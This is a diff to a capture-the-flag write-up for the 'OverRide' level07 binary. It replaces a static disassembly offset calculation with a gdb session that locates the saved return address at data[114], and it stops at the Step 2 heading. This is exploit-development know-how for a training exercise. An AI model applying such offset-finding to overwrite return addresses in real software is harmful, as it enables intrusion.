@@ -3,23 +3,45 @@
 This program is a simple number storage system. It stores and reads number in an array `unsigned int data[100]`. But we cannot store a number with `index % 3 == 0`.
 
 ## Step 1. Calculate offset to overwrite `eip`
+```assembly
+0x08048924 <+513>:	lea    eax,[esp+0x24]
+0x08048928 <+517>:	mov    DWORD PTR [esp],eax
+0x0804892b <+520>:	call   0x80486d7 <read_number>
 ```
-level07@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level07
-Dump of assembler code for function main:
-   0x08048723 <+0>:	push   ebp
-   0x08048724 <+1>:	mov    ebp,esp
-   0x08048726 <+3>:	push   edi
-   0x08048727 <+4>:	push   esi
-   0x08048728 <+5>:	push   ebx
-   0x08048729 <+6>:	and    esp,0xfffffff0
-   0x0804872c <+9>:	sub    esp,0x1d0
-[...]
-   0x080488e3 <+448>:	lea    eax,[esp+0x24]
-   0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
-   0x080488ea <+455>:	call   0x8048630 <store_number>
-[...]
 ```
-Offset is `0x1d0 - 0x24 + 0x8(padding) + 0x4(ebx) + 0x4(esi) + 0x4(edi) + 0x4(ebp) = 0x1c4(452)`. For a 32 bit integer array, `eip` locates in `data[114]`.
+level07@OverRide:~$ gdb -q level07
+(gdb) break *0x0804892b
+Breakpoint 1 at 0x804892b
+(gdb) run
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: read
+
+Breakpoint 1, 0x0804892b in main ()
+(gdb) info registers eax
+eax            0xffffd544	-10940
+(gdb) info frame
+Stack level 0, frame at 0xffffd710:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704,
+  eip at 0xffffd70c
+(gdb) print 0xffffd70c - 0xffffd544
+$1 = 456
+```
+We set a breakpoint before calling `read_number` function, then get offset `456` by calculating `eip - eax`. For a 32 bit integer array, `eip` locates in `data[114]`.
 
 ## Step 2. Find a way to set data[114]
 ```
